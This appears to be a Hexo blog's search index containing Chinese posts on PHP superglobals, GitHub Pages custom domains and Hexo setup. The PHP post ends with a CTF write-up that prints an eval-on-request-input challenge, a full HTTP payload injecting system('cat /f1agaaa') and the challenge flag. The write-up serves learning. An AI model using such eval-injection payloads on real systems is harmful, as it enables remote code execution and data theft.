<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>php 中$_xxx的一些总结</title>
    <url>/2023/05/18/CTF/php%20%E4%B8%AD$_xxx%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>在CTF时，总会见到下面这些变量，他们都是Array类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_COOKIE</span><br><span class="line">$_FILES</span><br><span class="line">$_REQUEST</span><br><span class="line">$_SERVER</span><br><span class="line">$_SESSION</span><br></pre></td></tr></table></figure>

<p>本篇文章旨在对其进行一个总结</p>
<h2 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h2><p><img src="/images/image-20230518101020945.png" alt="image-20230518101020945"></p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo $_GET[&#x27;a&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518101431312.png" alt="image-20230518101431312"></p>
<h2 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h2><p><img src="/images/image-20230518101521978.png" alt="image-20230518101521978"></p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo $_POST[&#x27;a&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518101657929.png" alt="image-20230518101657929"></p>
<h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h2><p>PHP 的 $_COOKIE 变量用于取回 cookie 的值。</p>
<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo $_COOKIE[&#x27;aaa&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="发送的数据包为"><a href="#发送的数据包为" class="headerlink" title="发送的数据包为"></a>发送的数据包为</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:88</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: aaa=11111</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518102219070.png" alt="image-20230518102219070"></p>
<h2 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h2><p>$_FILES通常用于获取上传文件有关的各种信息</p>
<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><h5 id="构造上传页面"><a href="#构造上传页面" class="headerlink" title="构造上传页面"></a>构造上传页面</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;index.php&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;upfile&quot;&gt;</span><br><span class="line">    &lt;button type=&quot;submit&quot;&gt;Upload&lt;/button&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518105254487.png" alt="image-20230518105254487"></p>
<h5 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:88</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------40805532493162472637768217925</span><br><span class="line">Content-Length: 223</span><br><span class="line">Origin: http://127.0.0.1:88</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1:88/test.html</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------40805532493162472637768217925</span><br><span class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------40805532493162472637768217925--</span><br></pre></td></tr></table></figure>

<p>若文件上传域的name属性值为upfile，则可以使用$_FILES[‘upfile’]访问文件的有关信息。</p>
<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><p>因为返回的是Array，所以这里使用var_dump读</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_FILES[&#x27;upfile&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518105132795.png" alt="image-20230518105132795"></p>
<p>可以echo出具体的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518105645844.png" alt="image-20230518105645844"></p>
<h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><p>接收不管是post还是get的内容，形成数组</p>
<h3 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_REQUEST);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518113528525.png" alt="image-20230518113528525"></p>
<p>同理，可以直接获取某一个键值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_REQUEST[&#x27;xxx&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518113614151.png" alt="image-20230518113614151"></p>
<h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><p>超级全局变量</p>
<p><img src="/images/image-20230518153914858.png" alt="image-20230518153914858"></p>
<h3 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h3><p>先全部输出看一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_SERVER);</span><br></pre></td></tr></table></figure>

<p>可以看到包括一些环境变量</p>
<p><img src="/images/image-20230518155502061.png" alt="image-20230518155502061"></p>
<p>也包含数据包相关的内容</p>
<p><img src="/images/image-20230518160407349.png" alt="image-20230518160407349"></p>
<h5 id="读取自定义请求头的内容"><a href="#读取自定义请求头的内容" class="headerlink" title="读取自定义请求头的内容"></a>读取自定义请求头的内容</h5><p>注意要大写，并加上HTTP_</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_SERVER[&#x27;HTTP_CMD&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518160705615.png" alt="image-20230518160705615"></p>
<h2 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION"></a>$_SESSION</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;test&#x27;]=aaaaaaaaaaaaaaaaaa;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518163056913.png" alt="image-20230518163056913"></p>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>这个session是会保持的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;ddddd&#x27;] = $_POST[&#x27;username&#x27;];</span><br><span class="line">var_dump($_SESSION)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上述的代码中，如果不关闭服务器服务</p>
<p>修改ddddd，前面的session也会输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#x27;ddddd&#x27;] </span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518164506882.png" alt="image-20230518164506882"></p>
<h5 id="释放session"><a href="#释放session" class="headerlink" title="释放session"></a>释放session</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset($_SESSION[&#x27;ddddd&#x27;]);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518170301891.png" alt="image-20230518170301891"></p>
<h5 id="通过-session-destroy-函数彻底终结-session"><a href="#通过-session-destroy-函数彻底终结-session" class="headerlink" title="通过 session_destroy() 函数彻底终结 session"></a>通过 session_destroy() 函数彻底终结 session</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="一道CTF"><a href="#一道CTF" class="headerlink" title="一道CTF"></a>一道CTF</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">eval($_REQUEST[$_GET[$_POST[$_COOKIE[&#x27;CTFshow-QQ群:&#x27;]]]][6][0][7][5][8][0][9][4][4]);</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_REQUEST[$_GET[$_POST[$_COOKIE[&#x27;CTFshow-QQ群:&#x27;]]]][6][0][7][5][8][0][9][4][4]</span><br></pre></td></tr></table></figure>

<p>可以放进phpStream里面分析，会帮你把闭合高亮出来</p>
<p><img src="/images/image-20230315200815285.png" alt="image-20230315200815285"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_REQUEST[$_GET[$_POST[$_COOKIE[&#x27;CTFshow-QQ群:&#x27;]]]]</span><br></pre></td></tr></table></figure>

<p>这里需要注意的是</p>
<p>cookie需要写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTFshow-QQ群:=。。。。。。。。。</span><br></pre></td></tr></table></figure>

<p>不能写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTFshow-QQ群=。。。。。。。。。</span><br></pre></td></tr></table></figure>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?b=c&amp;c[6][0][7][5][8][0][9][4][4]=system(&quot;cat%20%2ff1agaaa&quot;); HTTP/1.1</span><br><span class="line">Host: 41ed604f-03eb-4f5b-be5c-321d714b968c.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line">Origin: http://41ed604f-03eb-4f5b-be5c-321d714b968c.challenge.ctf.show</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://41ed604f-03eb-4f5b-be5c-321d714b968c.challenge.ctf.show/?b=c&amp;c[6][0][7][5][8][0][9][4][4]=system(%22ls%22);</span><br><span class="line">Cookie: CTFshow-QQ群:=a</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">a=b</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230315205526288.png" alt="image-20230315205526288"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;1b3be01d-059d-45c2-b917-a193b8ee8040&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>github绑定个人域名</title>
    <url>/2023/05/05/ForGithub/github%E7%BB%91%E5%AE%9A%E4%B8%AA%E4%BA%BA%E5%9F%9F%E5%90%8D/</url>
    <content><![CDATA[<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p><a href="https://www.godaddy.com/zh-sg">域名注册购买,云服务器,建站,企业邮箱和网站安全-GoDaddy官方中文站</a></p>
<p>该站点可以用支付宝支付</p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>进去后更改币种为人名币</p>
<p>除了域名啥都不买</p>
<p>不一定要.com</p>
<h2 id="CNAME"><a href="#CNAME" class="headerlink" title="CNAME"></a>CNAME</h2><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub.example.com. IN CNAME hoge.example.com</span><br></pre></td></tr></table></figure>

<p>解释：【別名】 IN CNAME 【原名】</p>
<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>给某一个domain起多个名字。</p>
<p>类似于，jd.com,jd360.com,jingdong.com虽然是不同名字的域名，但是可以指向同一个原名jd.com。可以让企业的对外展示更加灵活。</p>
<h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jd360.com IN CNAME jd.com</span><br><span class="line"></span><br><span class="line">jingdong.com IN CNAME jd.com</span><br><span class="line"></span><br><span class="line">jd.com IN A 123.123.123.123 （这条是A记录例子）</span><br></pre></td></tr></table></figure>

<h5 id="dns配置示例"><a href="#dns配置示例" class="headerlink" title="dns配置示例"></a>dns配置示例</h5><p>其中blog是子域名，值指向github的blog的URL</p>
<p><img src="/images/image-20230505085456157.png" alt="image-20230505085456157"></p>
<p>然后等待生效即可</p>
<h2 id="github配置"><a href="#github配置" class="headerlink" title="github配置"></a>github配置</h2><p>上述域名的CNAME配置完成后，页面还不能加载出内容</p>
<p><img src="/images/image-20230505090035377.png" alt="image-20230505090035377"></p>
<p>需要在github中再进行一部分配置</p>
<p>进入仓库的setting</p>
<p><img src="/images/image-20230505090629790.png" alt="image-20230505090629790"></p>
<p>在page设置中添加domain</p>
<p><img src="/images/image-20230505090611227.png" alt="image-20230505090611227"></p>
<p>校验完成后等待一会即可</p>
<p><img src="/images/image-20230505090741056.png" alt="image-20230505090741056"></p>
]]></content>
      <categories>
        <category>ForGithub</category>
      </categories>
  </entry>
  <entry>
    <title>使用github搭建个人博客</title>
    <url>/2023/05/04/ForGithub/%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/106166402">https://zhuanlan.zhihu.com/p/106166402</a></p>
<h2 id="初始化github博客"><a href="#初始化github博客" class="headerlink" title="初始化github博客"></a>初始化github博客</h2><h3 id="创建仓库github-io"><a href="#创建仓库github-io" class="headerlink" title="创建仓库github.io"></a>创建仓库github.io</h3><p>新建一个仓库，名为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名.github.io</span><br></pre></td></tr></table></figure>

<p>比如，如果你的github用户名是test，那么你就新建test.github.io的仓库，将来博客访问地址就是 </p>
<p><a href="http://test.github.io/">http://test.github.io</a> </p>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>注册的邮箱一定要验证，否则不会成功；<br>仓库名字必须是：username.github.io，其中username是你的用户名；<br>仓库创建成功不会立即生效，需要等待一段时间<br>创建成功后，默认会在你这个仓库里生成一些示例页面，之后所有的代码就在这个仓库里</p>
<h3 id="创建一个新的文件"><a href="#创建一个新的文件" class="headerlink" title="创建一个新的文件"></a>创建一个新的文件</h3><p>creating a new file</p>
<p><img src="/images/image-20230427210634629.png" alt="image-20230427210634629"></p>
<p>注意，新文件的名字必须是 index.html，因为静态http文件托管服务的默认访问文件就是index.html</p>
<p><img src="/images/image-20230427211033346.png" alt="image-20230427211033346"></p>
<p>然后仓库中就会新建一个新的index.html</p>
<p><img src="/images/image-20230427211126285.png" alt="image-20230427211126285"></p>
<p>进入setting</p>
<p>找到Pages—-&gt;GitHub Pages</p>
<p><img src="/images/image-20230427211226403.png" alt="image-20230427211226403"></p>
<p>可以看到生成的url</p>
<p><img src="/images/image-20230427211311823.png" alt="image-20230427211311823"></p>
<p>访问</p>
<p><img src="/images/image-20230427211429618.png" alt="image-20230427211429618"></p>
<h2 id="windows下npm安裝"><a href="#windows下npm安裝" class="headerlink" title="windows下npm安裝"></a>windows下npm安裝</h2><h3 id="首先要了解"><a href="#首先要了解" class="headerlink" title="首先要了解"></a>首先要了解</h3><h5 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h5><p>nodejs 下的包管理器</p>
<h5 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h5><p>它主要用途是通过CommonJS 的语法把所有浏览器端需要发布的静态资源作相应的准备，比如资源的合并和打包。</p>
<h5 id="vue-cli"><a href="#vue-cli" class="headerlink" title="vue-cli"></a>vue-cli</h5><p>帮你快速开始一个vue的项目，也就是给你一套vue的结构，包含基础的依赖库，只需要npm install 就可以安装</p>
<h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
<p><img src="/images/image-20230427214607908.png" alt="image-20230427214607908"></p>
<p>这里下载的是LTS版本</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>一路next就行，更新了环境变量如果没有起效，重启下就好了</p>
<p><img src="/images/image-20230427220333673.png" alt="image-20230427220333673"></p>
<p>出现上图情况即安装成功</p>
<h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><p>Hexo是一个基于 Github Pages 的博客发布工具，支持Markdown格式，有众多优秀插件和主题</p>
<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/618864711">https://zhuanlan.zhihu.com/p/618864711</a></p>
<h3 id="下载链接-1"><a href="#下载链接-1" class="headerlink" title="下载链接"></a>下载链接</h3><p>官网： <a href="http://hexo.io/">http://hexo.io</a><br>github: <a href="https://github.com/hexojs/hexo">https://github.com/hexojs/hexo</a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于github pages存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，太过麻烦。</p>
<p>Hexo能够将这些md文件都放在本地，每次写完文章后调用命令来批量完成相关页面的生成，然后再将有改动的页面提交到github。</p>
<h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><p>1.由于是windows环境，很多命令既可以cmd来完成，也可以使用git bash来完成，但是部分命令会有一些问题，为避免出现不必要的问题，建议全部使用git bash来执行；<br>2.hexo不同版本差别比较大，网上很多文章的配置信息都是基于2.x的，所以注意不要被误导；<br>3.hexo有2种config.yml文件，一个是根目录下的全局的config.yml，一个是各个theme下的config.yml</p>
<h3 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230427220721568.png" alt="image-20230427220721568"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo -h</span><br></pre></td></tr></table></figure>

<p>出现下图即表示安装成功</p>
<p><img src="/images/image-20230427220802122.png" alt="image-20230427220802122"></p>
<p>新建一个文件夹（名字可以随便取），这个文件夹将来就作为你存放代码的地方</p>
<p>假设我这里是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\Github\WWW</span><br></pre></td></tr></table></figure>

<p>在该目录执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230427222527267.png" alt="image-20230427222527267"></p>
<p>hexo会自动下载一些文件到这个目录，包括node_modules，目录结构如下图</p>
<p><img src="/images/image-20230427222555181.png" alt="image-20230427222555181"></p>
<p>node_modules: 依赖包</p>
<p>public：存放生成的页面</p>
<p>scaffolds：生成文章的一些模板</p>
<p>source：用来存放你的文章</p>
<p>themes：主题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g # 生成</span><br></pre></td></tr></table></figure>

<p>执行以上命令之后，hexo就会在public文件夹生成相关html文件，这些文件将来都是要提交到github的</p>
<p><img src="/images/image-20230427222716128.png" alt="image-20230427222716128"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s # 启动服务</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230427222752584.png" alt="image-20230427222752584"></p>
<p>访问web</p>
<p><img src="/images/image-20230427222814493.png" alt="image-20230427222814493"></p>
<h3 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h3><p>搭建好网站之后，需要修改配置</p>
<p>打开博客目录下的_config.yml文件</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>title</td>
<td>网站的标题</td>
</tr>
<tr>
<td>subtitle</td>
<td>网站的副标题</td>
</tr>
<tr>
<td>description</td>
<td>对于网站的描述，主要用于SEO</td>
</tr>
<tr>
<td>keywords</td>
<td>网站的关键词，支持多个关键词</td>
</tr>
<tr>
<td>author</td>
<td>作者名</td>
</tr>
<tr>
<td>language</td>
<td>网站使用的语言，对于简体中文用户来说，语言的设置跟使用不同的主题有关，可以参考各自主题的文档自行配置，一般为zh-CN</td>
</tr>
<tr>
<td>timezone</td>
<td>设置网站的时区，如果不填则默认使用你电脑的时区</td>
</tr>
</tbody></table>
<p>修改完之后可以通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>重新更新博客</p>
<h3 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h3><p>上述是默认的主题，如果想改，下面链接中有不少主题</p>
<p><a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p>
<p>下面这篇文章也有不少推荐</p>
<p><a href="https://zhuanlan.zhihu.com/p/385525053">https://zhuanlan.zhihu.com/p/385525053</a></p>
<p>博客目录下的\themes目录就是存放主题的目录</p>
<p><img src="/images/image-20230427230210639.png" alt="image-20230427230210639"></p>
<p>这里以安装hexo-theme-3-hexo主题为例</p>
<p><a href="https://github.com/yelog/hexo-theme-3-hexo">https://github.com/yelog/hexo-theme-3-hexo</a></p>
<p>下载后自己重命名了放置\themes目录</p>
<p><img src="/images/image-20230427235501948.png" alt="image-20230427235501948"></p>
<p>修改博客目录的_config.yml文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: 3-hexo</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230428000925363.png" alt="image-20230428000925363"></p>
<p>然后重刷一下hexo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><p>blog的文章都放在blog根目录的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\source\_posts</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230428124606458.png" alt="image-20230428124606458"></p>
<p>.md文件中有些格式需要注意</p>
<p>文件开头需要有一些说明性字段</p>
<p>使用yaml格式放在开头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: test</span><br><span class="line">author: fn</span><br></pre></td></tr></table></figure>

<p>例如，下面多出来的选项后面会叙述</p>
<p><img src="/images/image-20230428150831967.png" alt="image-20230428150831967"></p>
<h3 id="图片加载"><a href="#图片加载" class="headerlink" title="图片加载"></a>图片加载</h3><p>文章可能会出现图片无法加载的问题</p>
<p><img src="/images/image-20230428235342344.png" alt="image-20230428235342344"></p>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/7ym0n/hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<p>修改博客目录下的_config.yml文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230429002339908.png" alt="image-20230429002339908"></p>
<p>然后需要在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\source\</span><br></pre></td></tr></table></figure>

<p>目录下新建一个images目录(自定义)，用于存放所有的图片</p>
<p>接下来最关键的一步，要将md文件中原本的图片引用更改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![image-20230429002339908](images/image-20230429002339908.png)</span><br></pre></td></tr></table></figure>

<p>上述步骤完成后，便可以加载图片了</p>
<h2 id="NexT主题"><a href="#NexT主题" class="headerlink" title="NexT主题"></a>NexT主题</h2><h3 id="添加tags"><a href="#添加tags" class="headerlink" title="添加tags"></a>添加tags</h3><p>打开 themes 的 next 的 _config.yml</p>
<p><img src="/images/image-20230428092033999.png" alt="image-20230428092033999"></p>
<p>搜索menu，是博客菜单选项，注释去掉就可以开启相应的模块</p>
<p>注意，修改之后要注意缩进，在hexo g的时候会报错</p>
<p><img src="/images/image-20230428092653690.png" alt="image-20230428092653690"></p>
<p>同时在blog的根目录执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page tags  # tags是对应的tag名</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230428093518943.png" alt="image-20230428093518943"></p>
<p>这一步是为了添加标签跳转的页面，存放在blog根目录的souce目录下</p>
<p><img src="/images/image-20230428093654513.png" alt="image-20230428093654513"></p>
<p>新建的是md文件，自己修改即可</p>
<p><img src="/images/image-20230428095631244.png" alt="image-20230428095631244"></p>
<p>添加的tag汇总下图位置出现</p>
<p><img src="/images/image-20230428092848010.png" alt="image-20230428092848010"></p>
<p>点击后</p>
<p><img src="/images/image-20230428093617986.png" alt="image-20230428093617986"></p>
<p>去除标签可以删除上述about目录，同时去除注释，然后hexo clean刷新</p>
<h3 id="添加搜索功能"><a href="#添加搜索功能" class="headerlink" title="添加搜索功能"></a>添加搜索功能</h3><p>在blog根目录下载搜索插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230428100300614.png" alt="image-20230428100300614"></p>
<p>在根目录的 _config.yml 文件中 的末尾添加下面的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hexo-generator-searchdb</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10</span><br></pre></td></tr></table></figure>

<p>在主题 的 _config配置文件中找到 local_search，下面的enable改为true</p>
<p><img src="/images/image-20230428100541908.png" alt="image-20230428100541908"></p>
<p>然后hexo刷新即可</p>
<p><img src="/images/image-20230428100723071.png" alt="image-20230428100723071"></p>
<h3 id="添加文章的字数统计"><a href="#添加文章的字数统计" class="headerlink" title="添加文章的字数统计"></a>添加文章的字数统计</h3><p>blog根目录下载插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230428101231294.png" alt="image-20230428101231294"></p>
<p>在根目录的 _config.yml 文件中 的末尾添加下面的内容</p>
